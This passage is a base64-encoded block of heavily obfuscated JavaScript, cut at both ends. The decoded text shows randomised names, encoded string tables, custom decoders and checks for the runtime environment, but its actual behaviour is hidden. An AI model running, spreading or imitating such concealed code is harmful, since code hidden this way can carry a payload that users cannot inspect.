4OV0pO00zc25Jdz0tUEk4WUdfRlsweDFdfX1pZihNM3NuSXc+LVBJOFlHX0ZbMHgxXSl7eUk5RVJBUS5wdXNoKChCcG1zQWV8TTNzbkl3PDxkaUtFaWhhKSZQSThZR19GWzB4M10pfXJldHVybiB6c2ZiakpEKHlJOUVSQVEpfWZ1bmN0aW9uIHRXWWFfYihaRDQyV3ope2lmKHR5cGVvZiB0S2ExYU5bWkQ0Mld6XT09PVBJOFlHX0ZbMHg1XSl7cmV0dXJuIHRLYTFhTltaRDQyV3pdPVlwdUg0SmkoQVVMVUFsW1pENDJXel0pfXJldHVybiB0S2ExYU5bWkQ0Mld6XX1UVE10Q0xNKHRLYTFhTj17fSxBVUxVQWw9WyIjY3xTTFRCXz9OVXApdj1vLGpRajQiLCI1Y0Q2VjAmcSNOKHs8OCwybHhIISEhPDY+cHhFLD1LSVwidSo7IXx3JjdYbVgmIiwiRkJ8LHFFeTZNTjRHJVM3dkV+OGVLeyM4YTRWN006bWhzZnIsaXt6ZHA0IiwiLz9TIXMwUmd7O29fJngoRjVPOU8wSChVUSIsIl5DRDBxTzxYJHpZRXdKUjducHVqQUQzYS9wQWB5OntwfERbO2F1Lj5RIiwiTGVuKkwwVjZcImY4fTt6PzlIPX1CN2dZQitwcSVlM1FjNV02JVdYKTlHSFNie313OD1IJiIsInh9Iz9uSyNkIUhgSi4hWWNiQ0VqeEBVMHRSZTllPSIsIll9JCwpVUNkb2NUXzEvLixCR2dPKTdLTihGJVEmIiwiYjJZaj94VEk0REFIJUFUVFVPOUkrU1twV2NWRkVLZiIsImB7USh2ZzFCKTRTYjRLe0lhPX5FYTBuSU87aDEmIiwiVGMyW1ojWHpORy9DZkA6TF97QHE4YjE2W3pdI1h4NFQiLCI8OjkhMlwid0I7TmdLezNhM3FDbEJjS0lJQlYzKCYiLCJRUWI/PCVmbClmZERGUzZwNVhlT1k6VjZ9XiYzZFtcIjdGWGlRVS5uIiwib3Y3ZX5BSnFGO2BiUn1AXWlDVDZwRF8mIiwifTolLmZVQTZlWEh+NGlrMzh4WDt4N0ZqZXh0c1dfMlR5K2lmKUtcIjBRenRzemh4Y3lCJXliYV9IdX1qam4iLCJnfGBFUGFxelRsYH5jaGlwMXNVc2hhe1VjSEI3VWE0RlpEOEI2RE9CdFIqXz0rKkMiLCIpalF5fU8qa2RENjMsa1k4UE9tZnx4ISYiLCJaUlEuN2d9X25wMWd1empzJm8oW0kwNE4rKyVRSz0iLCIoe0tFQUFZQz5mM19pMypJRlNFLH5EXU5BWHRfIWhMMlZMSGYiLCJ+UUAuQlNJOSgvY19BQT5DS2pOZWMjamo7PjxqaDNfc3ZGSSxXWDRecWw5REFMKCIsIllGIyUkVDBJMX5YIiwiUDtmZUQ3bTAwZiIsIk11XTsvJUdfRF5je1Era2lwcGNPOUFpOC47dl8saDhJOUddP3BBSGR0K3ZfUHpqbDV2X1N4W2J6NS9vMCYiLCIsK1BPO3ZuIiwiRXYsQkxibjI5Rix6ckpeTFNPYGVPRVRwLERqRS8vM2NbRiQjeiMzOEtmUFY0PVN2L2V5akZBbiIsIkNHaVE/YT5OLEdHfEBrTzMwbiIsImxMT0VxaXw0en05PzU9ODkyQlhPb3xVOTlORltJeUwsJkI8YmZ4eWQqeCl2Uj1WXVtuIiwiM3tTO2NEZSlKRk0+cXhxZE57Kzs6fDtnL1BoXCJYOjJUZ24iLCJiR0lRakthejEvJGMxTEVUPDduSVMudHRKRjV9VEpHSVh1Mk9hdWF6QHpvZy52MkxpRiVxdjg4bGNmKyMmIiwiUW8mSVdyYUJKRzVQb0w4SklqfCM0aih8QWZUYlFoNCIsImJEd2osdztwVk5KX1M9PWNrNF9MOS5aQjYiLCI3e24qY1NmbFlSMygrXCJHSzl7U2ZuS0E2PyIsIi5mayFUdyF6bnB5aHgrQ2QkZSlbZyNHMVorNV9nK3tJQ0NhP2o6fD9tR04iLCJIRGFPVGtsOGREISEkeW1kfkhVMHlqZno1fiFfXjNzMkN4bEVxaUhCJjs2PyUrdWw3aiNmIiwiYD9BcXdfbjJ5IiwiQ2UjMEFUbHozRkw9TnpMMn4hcz8iLCJORihPVjArZEVwQiVsTFR2cVNOQmouaWxJK109Oj08QkMrRz84IV50citYIiwiPzt3MDBpLkk7emN2eEFQSVN2OTsvRH4mIiwiW3MmMWR7R19yUmRiSllWZHRvYj9KVEgxMkYuUDIhcDdCNEgwbSV8P3J+N0dXIVtza29MMz86aD5HZmRjJiIsImp7KFshMT1kRytgVmVBakxfbiIsIltzJCVkWW4iLCJVYmM7LGd9QlpSMFYoWTw3T1glRWBbcWRgOyFSRitPMyIsInE0Pj9KQStfVU4xKzh8eDJtRiEza3t9ZFE7ZmY1fT45IiwiRDdbOzxBLCljeFFDYHw4c2lqVVEiLCJDO2M7WHRqXXkiLCJHLDwhJngvfFwieGBnWj13JEVEUShGXWFafD5EfHpbZGlWamtmXzc0KSIsIks0QyFJclROcHhPOGNoMDd+SFshVGchbFFsPCZ0dkNCdy9iP2xhKmFiY3giLCJmakhmZFJtVTNjPTdnQU1DfnRuO1JbOUs6NEcmPVwiXXAiLCJARzkqbS5LPlhjLzd6eFk4IiwiMVJ1LE43ZTBqLzA5cl89Si5PQz9CU0s0XUYpeiYiLCJ7Zi5bfkEuKSIsImE3VCUrVGddRHF1IzVBY0ZaYkkwaTtzNn4vT2doKzBdY3Y+P01rPzI5RiIsIjF9czBNdSo4KkhhfGEhRTM7OlkjPXRkOCNGNjtBTE5kfnsmSU5FbiIsIk46bjNBLiphMkQpdj1MY0xnfEJzO0BaNmpELiIsIkA3Zjs1T1U5UkYmO2I6aWxReG4xdEhVdG99fGVrTlUkQUdTO2hLPWRhZjNPSzMwXTVYdihqS04pIiwiJkg/MDlTN3A+ZjdabCl8OS43eChGRHk2SmMhUH0vODl3Nz9zPlpjcSV+P3t7OWhpXCJ9YWVJIiwicTtTPztpIWt9fkNOLGs+QzF2VnNiWm9YYyt4UmtUM2RfRkghX1pWZFwiSC45TkpuOSNEamUvLkwwSkROcCYiLCJpZllzbzFJMG9GYHwxKyYyelNkMUAlTmpZcWBQZltEQmF1WGUue3lhUSIsIkR7TDEsXXtJa1Jyamk9ZnA/eHUoUkhAMCtId2ptK1YsRWMpW1BxdElyUjMiLCJjND4hVGs1dHArNHtPQV1UMnsvJWBbaCkiLCJie3xTMHZGOSV+UF4vYWlzY3B4cVMjRXpweDBzLD09S2YmIiwiZXtSITpPOGs4WFtgdWhcIixVNyhleTo5VXs7IV9qfHxwI11ZI3clfDkhcH1FY2goRik7ITMjT24iLCIvUz15REVoPj40aDNda1g4VDsrclBqMk5QK35Pb1wiPGR3LGVmY1N4cHh+bzpHS1gsTURReUw7NU5BbDciLCJPOkIjai5Yejg7L0lFUUlCSkN6KHwuXUszRkNPOit7dnBIdSN1RUM4ZkchLCYiLCJ3T18oeXFcIk5YTkNOM1wiKXAze35qbjouXSVxSyIsIlJGJFErI0dPQDszIzZcIihULCs4W2FLNkomZlt8WFkuN0ZMQ2YiLCImWE9CXCJEZEgrSFFoeH1JQlhjJS5uOnUmIiwiNWp3c1F0fWRuKzRZflwiLDJbfTYwQncrbHRSKEkrTHx2dURqeTRfVzA7Pl0jS2t2SiV+cyFKIiwiS3tUczFYezRLPl5bSnY/Sjw6RSVvSCNId3pNfGtUfkw/JiIsIitwVVNtQUJxIz5vX3hBNGxlT0A2N3J5Sj0iLCJtLG0hMlwiblUxR0EuSE5uQ2wrKyVuWjY2fkdIfmtOWTg2ITw7QF90SWtWVF9nM14iLCJwOzdlK0tSaltOUXZMYWszVGZKM0YuQ19xbDhfUks9YzxEeTBhS1s5YFhLKEMpIiwiVHs8LFh0cWRcInghIiwidVhdZiw4dDQ1fX4oXmlKLEZ0d3NXdVkxTi8kXCJJIVtwQXVwMU8xYHp1LyIsImB2fWVAckZLYDtuT2ZLWUtdTyY7PzdKbClIZSU4L1IyUjokI013Y3FQeCsxR1FMOFpuIiwiMj9DZnZ7biIsInY/I1EqO25LRjtGOjVrQTdLQnVzfXEzZDYiLCJNRnYoZyVYayorKTN7PXppbWI3T0wlMjlOY2ksXUFMLHE9UmZWXSZ6eSIsIlY7JCN+RFN6fD4xUSYiLCIsOzNqeFpuIiwib3tZUSFAbDh7el4xMk5HdmtdLmV2MTU0dCt0KFBfcF15ZnhCXTF8e0crcmpdWzZwXz96KDZxa2thSExbbiIsIl91ZGUqMEs5aXphYG9Oc3ZTdVUwQlk0OU8+NntweVNwZ0chO2FYJnFwSGw9UUFkbHRvNjBsIiwiUzt0NnxbZGFwNCIsInlDMltHYUJxQnBWN0BTJnYoUzkqeVoqNkV+bUVgL1BDT094NiIsImtHOjMsXUhCNj5SNkY9QjIqamJPbzhxSCpIX3BCW0UzO24iLCJSe3MhQX11OG16KzFSK3pMY1g4KFYwKF5NLyIsIiFYaDEjaUhkZk5MRztZVWh9OytJaVwiWiYiLCJTZnQsQDA1MD1ma0RjeGFdRX1QeWl3bTQxRCVxKGEpOSQ7RHNsRHNCKTsxOCFoMzgiLCJ9RHolM2s8d0V9elwiXzk7ZFwiL2hJODElMEFYSjlcIkouaX5YfCVQcVc5V0dRTiYiLCJeanQlWzpqSWBYc1o/dkwyJDQvI1l4SUk4ZiIsIjtPZkl6YTc5a1BKW0R2P3B3T09lTVM8JnBselwiZmh0M3xGN08hRTwmIiwiYX1Vc0V1Ok5jUG5JPS5NOH50cmJsQTpwKCNUMHRKK0ZSL2chOiFFZE59ZXNIfF5sbkgmIiwiKnhxI2dEVjh1L3RWWTlPN1lHRTB0UkUmSk5UWm5oPkNGXTwhXCJUVCkiLCIrK3RzfUVGKShHfns8TFVdSSYiLCI4UWE/dlkxcCIsImltSF5eUjkiLCIxSlshUF9HJVZbXnFwZlYiLCJwaGw0UyRpKSIsIlBjUXkwcWtTRiIsIiFnNUtBMzRmclNjbGR7XjlgWXYlcndGIiwiZn05bSIsIk1iSEN5c1BMUV0iLCJnPDgjSm47cEJqfSIsIkpKQXkpdF9rQX5TJkIiLCIsVlN9JDx8QSIsIk9PVyw3fH0pV2B+YkEiLCJkVHxZU18jIiwiNj1SXSEiLCJGUEs2SDgqSCo0XiIsInRNKl5qazhMM1hrb0xXVCIsIlJ9cnpbIz41PCIsIm40QFAlY0MiLCI3TUg9WWQuUH5GIiwiU2lXdFAiLCJ0fUtiYkdDIiwidXpUM1hAUmwiLCJ6VG1yc0F0WWYrcVU7IiwiMW9Mcjx6ez5+MjZHZi5jYFwiQzQkU2pfN3U8fkclUXtWWCxrJU9mVTdZWC9SdikxKj4zYV89cEZcIkt5d1JWME0qNigrZnRcIklCTzRRTy99a1ZMeXJ9dEcrO102QzF7KyFsUiFlRkZOK0p2Q10lIT9mbFUoNy88OVAwTXt1U2ViT1ReMWtkTlcrK3Y1XSUvYy9pLGN5RmkiLCJhPWVvUS5UYHYwezMlMTFWSU57Y0huX0FTfWV+W1RAMWYqRCIsImYqZW9INkdbIiwiQ3BdQ2UiLCIzVWcwNzlcImY4bSh0PGgiLCIlTi8wSSY0NDwiLCI7L1ldJGN0ZV5zUEo3d1RDXCJDXCJHVTYjMiIsIn05VkclLH1SIiwid1NkUykiLCJocDYhQSs8Pyg/S218UmdMKUA/QjIiLCJMcCNaei4/c2F9IiwiOVVcIkkyIiwidGFPWmxePlsiLCJTdmVvNDl1IiwiXCJPWW9QJkA0b2o9SU9UYyhCOyIsIioqQHpOcjdbcV90M3pSIiwiTFNcIklUejJLS1E0WUhmaCIsIlM3YTU6JntBY1E1ZCg7ZlBHKldoMCIsIiM3dTAxY14kY1F+WVt2UVZOdkRIdF8uWTpqTzUkKWwxYXR4QjErSUsqSXQzQ1tXKE05XCJJbm51IiwidnBSenBydSIsIlN2SkhPLjEwZX13IiwicHBYZDlsNGZXXzJfJVIiLCJ9KlUwNzlMfUMiLCJgOj9CSDlcImZiQ35yR1RXIiwiQ2tyQkErZENwX3Qzd2c0YTpwP0IiLCIycDRaNCIsIj49VUhpeiYkO21AIiwiYjpxKz8jeUM+R34kZ3Y0SiIsIiMqc2xqSiM9IiwiTHAwQiIsImI6N3pdOUdbNlc1ZC5SdjQvNTljLGN1IiwicXRXJWhROiIsIixFNmxTWTJYX3tcIlpPflsiLCJsaFNkUyIsIlk1WiYiLCJhKVd9I31jYU1pdFwiNDw1TCIsIlZoMnkiLCIzdyt5Y0ohYUYiXSk7ZnVuY3Rpb24gQXo4T3BmRigpe3ZhciB0S2ExYU49W2Z1bmN0aW9uKCl7cmV0dXJuIGdsb2JhbFRoaXN9LGZ1bmN0aW9uKCl7cmV0dXJuIGdsb2JhbH0sZnVuY3Rpb24oKXtyZXR1cm4gd2luZG93fSxmdW5jdGlvbigpe3JldHVybiBuZXcgRnVuY3Rpb24oInJldHVybiB0aGlzIikoKX1dLEFVTFVBbCxaRDQyV3osVmo2SmNoO1RUTXRDTE0oQVVMVUFsPXZvaWQgMHgwLFpENDJXej1bXSk7dHJ5e1RUTXRDTE0oQVVMVUFsPU9iamVjdCxaRDQyV3pbUEk4WUdfRlsweGJdXSgiIi5fX3Byb3RvX18uY29uc3RydWN0b3IubmFtZSkpfWNhdGNoKHlJOUVSQVEpe31uTzFhMWFQOmZvcihWajZKY2g9UEk4WUdfRlsweDBdO1ZqNkpjaDx0S2ExYU5bUEk4WUdfRlsweDRdXTtWajZKY2grKyl0cnl7dmFyIEJwbXNBZTtBVUxVQWw9dEthMWFOW1ZqNkpjaF0oKTtmb3IoQnBtc0FlPVBJOFlHX0ZbMHgwXTtCcG1zQWU8WkQ0Mld6W1BJOFlHX0ZbMHg0XV07QnBtc0FlKyspaWYodHlwZW9mIEFVTFVBbFtaRDQyV3pbQnBtc0FlXV09PT1QSThZR19GWzB4NV0pY29udGludWUgbk8xYTFhUDtyZXR1cm4gQVVMVUFsfWNhdGNoKHlJOUVSQVEpe31yZXR1cm4gQVVMVUFsfHx0aGlzfVRUTXRDTE0oWkQ0Mld6PUF6OE9wZkYoKXx8e30sVmo2SmNoPVpENDJXei5UZXh0RGVjb2Rlcix5STlFUkFRPVpENDJXei5VaW50OEFycmF5LEJwbXNBZT1aRDQyV3ouQnVmZmVyLGRpS0VpaGE9WkQ0Mld6LlN0cmluZ3x8U3RyaW5nLE0zc25Jdz1aRDQyV3ouQXJyYXl8fEFycmF5LHZBcktfeD1mdW5jdGlvbigpe3ZhciB0S2ExYU49bmV3IE0zc25JdyhQSThZR19GWzB4MWJdKSxBVUxVQWwsWkQ0Mld6O1RUTXRDTE0oQVVMVUFsPWRpS0VpaGFbUEk4WUdfRlsweDhdXXx8ZGlLRWloYS5mcm9tQ2hhckNvZGUsWkQ0Mld6PVtdKTtyZXR1cm4gZnVuY3Rpb24oVmo2SmNoKXt2YXIgeUk5RVJBUSxCcG1zQWUsTTNzbkl3LHZBcktfeDtUVE10Q0xNKEJwbXNBZT12b2lkIDB4MCxNM3NuSXc9Vmo2SmNoW1BJOFlHX0ZbMHg0XV0sWkQ0Mld6W1BJOFlHX0ZbMHg0XV09UEk4WUdfRlsweDBdKTtmb3IodkFyS194PVBJOFlHX0ZbMHgwXTt2QXJLX3g8TTNzbkl3Oyl7VFRNdENMTShCcG1zQWU9Vmo2SmNoW3ZBcktfeCsrXSxCcG1zQWU8PVBJOFlHX0ZbMHgxYV0/eUk5RVJBUT1CcG1zQWU6QnBtc0FlPD0weGRmP3lJOUVSQVE9KEJwbXNBZSYweDFmKTw8UEk4WUdfRlsweDddfFZqNkpjaFt2QXJLX3grK10mUEk4WUdfRlsweDZdOkJwbXNBZTw9MHhlZj95STlFUkFRPShCcG1zQWUmMHhmKTw8UEk4WUdfRlsweGFdfChWajZKY2hbdkFyS194KytdJlBJOFlHX0ZbMHg2XSk8PFBJOFlHX0ZbMHg3XXxWajZKY2hbdkFyS194KytdJlBJOFlHX0ZbMHg2XTpkaUtFaWhhW1BJOFlHX0ZbMHg4XV0/eUk5RVJBUT0oQnBtc0FlJlBJOFlHX0ZbMHg5XSk8PDB4MTJ8KFZqNkpjaFt2QXJLX3grK10mUEk4WUdfRlsweDZdKTw8UEk4WUdfRlsweGFdfChWajZKY2hbdkFyS194KytdJlBJOFlHX0ZbMHg2XSk8PFBJOFlHX0ZbMHg3XXxWajZKY2hbdkFyS194KytdJlBJOFlHX0ZbMHg2XTooeUk5RVJBUT1QSThZR19GWzB4Nl0sdkFyS194Kz1QSThZR19GWzB4MTldKSxaRDQyV3pbUEk4WUdfRlsweGJdXSh0S2ExYU5beUk5RVJBUV18fCh0S2ExYU5beUk5RVJBUV09QVVMVUFsKHlJOUVSQVEpKSkpfXJldHVybiBaRDQyV3ouam9pbigiIil9fSgpKTtmdW5jdGlvbiB6c2ZiakpEKHRLYTFhTil7cmV0dXJuIHR5cGVvZiBWajZKY2ghPT1QSThZR19GWzB4NV0mJlZqNkpjaD9uZXcgVmo2SmNoKCkuZGVjb2RlKG5ldyB5STlFUkFRKHRLYTFhTikpOnR5cGVvZiBCcG1zQWUhPT1QSThZR19GWzB4NV0mJkJwbXNBZT9CcG1zQWUuZnJvbSh0S2ExYU4pLnRvU3RyaW5nKCJ1dGYtOCIpOnZBcktfeCh0S2ExYU4pfWZ1bmN0aW9uIHc3MHo4Rigpe31mdW5jdGlvbiB3WjdzUXZlKFpENDJXeixWajZKY2g9UEk4WUdfRlsweDFdKXtmdW5jdGlvbiB5STlFUkFRKFpENDJXeil7dmFyIFZqNkpjaD0iOWRwSG1TQUVYbmlQVkRzUU9UQlphKUM4cngxfmBlJVdeJEZOR3pdY2h0M0o1QEk0cSg+e0tiITx5bzsqTGYuajJba1UmLD1SdTZfMGc/dk1sWSt9I1wiOnc3fC8iLHlJOUVSQVEsQnBtc0FlLHRLYTFhTixBVUxVQWwsZGlLRWloYSxNM3NuSXcsdkFyS194O1RUTXRDTE0oeUk5RVJBUT0iIisoWkQ0Mld6fHwiIiksQnBtc0FlPXlJOUVSQVEubGVuZ3RoLHRLYTFhTj1bXSxBVUxVQWw9UEk4WUdfRlsweDBdLGRpS0VpaGE9UEk4WUdfRlsweDBdLE0zc25Jdz0tUEk4WUdfRlsweDFdKTtmb3IodkFyS194PVBJOFlHX0ZbMHgwXTt2QXJLX3g8QnBtc0FlO3ZBcktfeCsrKXt2YXIgWXB1SDRKaT1WajZKY2guaW5kZXhPZih5STlFUkFRW3ZBcktfeF0pO2lmKFlwdUg0Smk9PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKE0zc25JdzxQSThZR19GWzB4MF0pe00zc25Jdz1ZcHVINEppfWVsc2V7VFRNdENMTShNM3NuSXcrPVlwdUg0SmkqUEk4WUdfRlsweGNdLEFVTFVBbHw9TTNzbkl3PDxkaUtFaWhhLGRpS0VpaGErPShNM3NuSXcmUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0odEthMWFOLnB1c2goQVVMVUFsJlBJOFlHX0ZbMHgzXSksQVVMVUFsPj49UEk4WUdfRlsweDJdLGRpS0VpaGEtPVBJOFlHX0ZbMHgyXSl9d2hpbGUoZGlLRWloYT5QSThZR19GWzB4OV0pO00zc25Jdz0tUEk4WUdfRlsweDFdfX1pZihNM3NuSXc+LVBJOFlHX0ZbMHgxXSl7dEthMWFOLnB1c2goKEFVTFVBbHxNM3NuSXc8PGRpS0VpaGEpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQodEthMWFOKX1mdW5jdGlvbiBCcG1zQWUoWkQ0Mld6KXtpZih0eXBlb2YgdEthMWFOW1pENDJXel09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5bWkQ0Mld6XT15STlFUkFRKEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19T2JqZWN0W3RXWWFfYigweDVkKV0oWkQ0Mld6LEJwbXNBZSgweDVlKSx7W0JwbXNBZSgweDVmKV06Vmo2SmNoLFtCcG1zQWUoMHg2MCldOlBJOFlHX0ZbMHgxMV19KTtyZXR1cm4gWkQ0Mld6fWZ1bmN0aW9uIFRUTXRDTE0oKXtUVE10Q0xNPWZ1bmN0aW9uKCl7fX0oZnVuY3Rpb24oKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gWkQ0Mld6KFpENDJXeil7dmFyIFZqNkpjaD0iOngpdy9ERnUyeXJJQ0J2Y148aSo2TFssK2x+fWtQU2RzcE5WOzEuYFRhJmhFfFwiMG44T3RXWDQ5ZW9HWT97ZzVLKEAjcU0zJF8hSmZIJWpSUXo9YlU+N0FtXVoiLHlJOUVSQVEsQnBtc0FlLGRpS0VpaGEsTTNzbkl3LHZBcktfeCxZcHVINEppLHRXWWFfYjtUVE10Q0xNKHlJOUVSQVE9IiIrKFpENDJXenx8IiIpLEJwbXNBZT15STlFUkFRLmxlbmd0aCxkaUtFaWhhPVtdLE0zc25Jdz1QSThZR19GWzB4MF0sdkFyS194PVBJOFlHX0ZbMHgwXSxZcHVINEppPS1QSThZR19GWzB4MV0pO2Zvcih0V1lhX2I9UEk4WUdfRlsweDBdO3RXWWFfYjxCcG1zQWU7dFdZYV9iKyspe3ZhciBBejhPcGZGPVZqNkpjaC5pbmRleE9mKHlJOUVSQVFbdFdZYV9iXSk7aWYoQXo4T3BmRj09PS1QSThZR19GWzB4MV0pY29udGludWU7aWYoWXB1SDRKaTxQSThZR19GWzB4MF0pe1lwdUg0Smk9QXo4T3BmRn1lbHNle1RUTXRDTE0oWXB1SDRKaSs9QXo4T3BmRipQSThZR19GWzB4Y10sTTNzbkl3fD1ZcHVINEppPDx2QXJLX3gsdkFyS194Kz0oWXB1SDRKaSZQSThZR19GWzB4ZF0pPlBJOFlHX0ZbMHhlXT9QSThZR19GWzB4Zl06UEk4WUdfRlsweDEwXSk7ZG97VFRNdENMTShkaUtFaWhhLnB1c2goTTNzbkl3JlBJOFlHX0ZbMHgzXSksTTNzbkl3Pj49UEk4WUdfRlsweDJdLHZBcktfeC09UEk4WUdfRlsweDJdKX13aGlsZSh2QXJLX3g+UEk4WUdfRlsweDldKTtZcHVINEppPS1QSThZR19GWzB4MV19fWlmKFlwdUg0Smk+LVBJOFlHX0ZbMHgxXSl7ZGlLRWloYS5wdXNoKChNM3NuSXd8WXB1SDRKaTw8dkFyS194KSZQSThZR19GWzB4M10pfXJldHVybiB6c2ZiakpEKGRpS0VpaGEpfWZ1bmN0aW9uIFZqNkpjaChWajZKY2gpe2lmKHR5cGVvZiB0S2ExYU5bVmo2SmNoXT09PVBJOFlHX0ZbMHg1XSl7cmV0dXJuIHRLYTFhTltWajZKY2hdPVpENDJXeihBVUxVQWxbVmo2SmNoXSl9cmV0dXJuIHRLYTFhTltWajZKY2hdfWNvbnN0IHlJOUVSQVE9Vmo2SmNoKDB4NjEpLEJwbXNBZT1QSThZR19GWzB4MTNdO2xldCBkaUtFaWhhPVBJOFlHX0ZbMHgxMV0sTTNzbkl3PVBJOFlHX0ZbMHgxZl07ZnVuY3Rpb24gdkFyS194KFpENDJXeix5STlFUkFRLEJwbXNBZSl7aWYoIUJwbXNBZSl7QnBtc0FlPWZ1bmN0aW9uKFpENDJXeil7aWYodHlwZW9mIHRLYTFhTltaRDQyV3pdPT09UEk4WUdfRlsweDVdKXtyZXR1cm4gdEthMWFOW1pENDJXel09eUk5RVJBUShBVUxVQWxbWkQ0Mld6XSl9cmV0dXJuIHRLYTFhTltaRDQyV3pdfX1pZigheUk5RVJBUSl7eUk5RVJBUT1mdW5jdGlvbihaRDQyV3ope3ZhciB5STlFUkFRPSJGX2ttdTE2KiVFdjJ9PFReWj4rVTV8eiZmI0Akby8ufjl4SiE/eUE7Z2hJOjNNe24oPXBlNDdgTGw4XUhyXCJxLDB3UylPQlBLaUNkYURzTlhbYllqR3RjUlZRVyIsQnBtc0FlLFZqNkpjaCxkaUtFaWhhLE0zc25Jdyx2QXJLX3gsWXB1SDRKaSx0V1lhX2I7VFRNdENMTShCcG1zQWU9IiIrKFpENDJXenx8IiIpLFZqNkpjaD1CcG1zQWUubGVuZ3RoLGRpS0VpaGE9W10sTTNzbkl3PVBJOFlHX0ZbMHgwXSx2QXJLX3g9UEk4WUdfRlsweDBdLFlwdUg0Smk9LVBJOFlHX0ZbMHgxXSk7Zm9yKHRXWWFfYj1QSThZR19GWzB4MF07dFdZYV9iPFZqNkpjaDt0V1lhX2IrKyl7dmFyIEF6OE9wZkY9eUk5RVJBUS5pbmRleE9mKEJwbXNBZVt0V1lhX2JdKTtpZihBejhPcGZGPT09LVBJOFlHX0ZbMHgxXSljb250aW51ZTtpZihZcHVINEppPFBJOFlHX0ZbMHgwXSl7WXB1SDRKaT1BejhPcGZGfWVsc2V7VFRNdENMTShZcHVINEppKz1BejhPcGZGKlBJOFlHX0ZbMHhjXSxNM3NuSXd8PVlwdUg0Smk8PHZBcktfeCx2QXJLX3grPShZcHVINEppJlBJOFlHX0ZbMHhkXSk+UEk4WUdfRlsweGVdP1BJOFlHX0ZbMHhmXTpQSThZR19GWzB4MTBdKTtkb3tUVE10Q0xNKGRpS0VpaGEucHVzaChNM3NuSXcmUEk4WUdfRlsweDNdKSxNM3NuSXc+Pj1QSThZR19GWzB4Ml0sdkFyS194LT1QSThZR19GWzB4Ml0pfXdoaWxlKHZBcktfeD5QSThZR19GWzB4OV0pO1lwdUg0Smk9LVBJOFlHX0ZbMHgxXX19aWYoWXB1SDRKaT4tUEk4WUdfRlsweDFdKXtkaUtFaWhhLnB1c2goKE0zc25Jd3xZcHVINEppPDx2QXJLX3gpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoZGlLRWloYSl9fXJldHVybiBaRDQyV3pbVmo2SmNoKDB4NjIpXShuZXcgUmVnRXhwKEJwbXNBZSgweDYzKSxQSThZR19GWzB4MTJdKSxCcG1zQWUoMHg2NCkpfWNvbnN0IFlwdUg0Smk9QnBtc0FlPyJnaSI6UEk4WUdfRlsweDEyXSx0V1lhX2I9bmV3IFJlZ0V4cCh2QXJLX3goeUk5RVJBUSksWXB1SDRKaSk7ZnVuY3Rpb24gQXo4T3BmRihaRDQyV3osVmo2SmNoLHlJOUVSQVEpe2lmKCF5STlFUkFRKXt5STlFUkFRPWZ1bmN0aW9uKFpENDJXeil7aWYodHlwZW9mIHRLYTFhTltaRDQyV3pdPT09UEk4WUdfRlsweDVdKXtyZXR1cm4gdEthMWFOW1pENDJXel09Vmo2SmNoKEFVTFVBbFtaRDQyV3pdKX1yZXR1cm4gdEthMWFOW1pENDJXel19fWlmKCFWajZKY2gpe1ZqNkpjaD1mdW5jdGlvbihaRDQyV3ope3ZhciBWajZKY2g9IixCTFhKMDMjLyU7KG0uPF54XWV+PW9UR2BGMmgkX0hDeVd9NXtNZGl8Ullid1wiTkVyTzpBJlpTS2NqKXNQZlt2VjR1bjc4K3FhSSo/UXRENnprbCE5PnAxVUBnIix5STlFUkFRLEJwbXNBZSxNM3NuSXcsdkFyS194LFlwdUg0Smksd1o3c1F2ZSxvRW9EVjg4O1RUTXRDTE0oeUk5RVJBUT0iIisoWkQ0Mld6fHwiIiksQnBtc0FlPXlJOUVSQVEubGVuZ3RoLE0zc25Jdz1bXSx2QXJLX3g9UEk4WUdfRlsweDBdLFlwdUg0Smk9UEk4WUdfRlsweDBdLHdaN3NRdmU9LVBJOFlHX0ZbMHgxXSk7Zm9yKG9Fb0RWODg9UEk4WUdfRlsweDBdO29Fb0RWODg8QnBtc0FlO29Fb0RWODgrKyl7dmFyIGhRMGZPTz1WajZKY2guaW5kZXhPZih5STlFUkFRW29Fb0RWODhdKTtpZihoUTBmT089PT0tUEk4WUdfRlsweDFdKWNvbnRpbnVlO2lmKHdaN3NRdmU8UEk4WUdfRlsweDBdKXt3WjdzUXZlPWhRMGZPT31lbHNle1RUTXRDTE0od1o3c1F2ZSs9aFEwZk9PKlBJOFlHX0ZbMHhjXSx2QXJLX3h8PXdaN3NRdmU8PFlwdUg0SmksWXB1SDRKaSs9KHdaN3NRdmUmUEk4WUdfRlsweGRdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oTTNzbkl3LnB1c2godkFyS194JlBJOFlHX0ZbMHgzXSksdkFyS194Pj49UEk4WUdfRlsweDJdLFlwdUg0SmktPVBJOFlHX0ZbMHgyXSl9d2hpbGUoWXB1SDRKaT5QSThZR19GWzB4OV0pO3daN3NRdmU9LVBJOFlHX0ZbMHgxXX19aWYod1o3c1F2ZT4tUEk4WUdfRlsweDFdKXtNM3NuSXcucHVzaCgodkFyS194fHdaN3NRdmU8PFlwdUg0SmkpJlBJOFlHX0ZbMHgzXSl9cmV0dXJuIHpzZmJqSkQoTTNzbkl3KX19aWYoZGlLRWloYSl7cmV0dXJuIFBJOFlHX0ZbMHgxM119aWYoWkQ0Mld6W3lJOUVSQVEoUEk4WUdfRlsweDE0XSldPT09Tm9kZVt5STlFUkFRKDB4NjYpXSl7ZnVuY3Rpb24gQnBtc0FlKFpENDJXeil7dmFyIFZqNkpjaD0iI0FEb09KUllwVkZsdShcIkJkMUdgPU02d2lxblBqfWhbLF4rOzJOdDlAcyRVKj97YV94IVdiSX41PFQ3UWNlPi55OG1TWEwzJSZFNF1LfDByZyl2ekNmOkgvWmsiLHlJOUVSQVEsQnBtc0FlLE0zc25Jdyx2QXJLX3gsWXB1SDRKaSx3WjdzUXZlLG9Fb0RWODg7VFRNdENMTSh5STlFUkFRPSIiKyhaRDQyV3p8fCIiKSxCcG1zQWU9eUk5RVJBUS5sZW5ndGgsTTNzbkl3PVtdLHZBcktfeD1QSThZR19GWzB4MF0sWXB1SDRKaT1QSThZR19GWzB4MF0s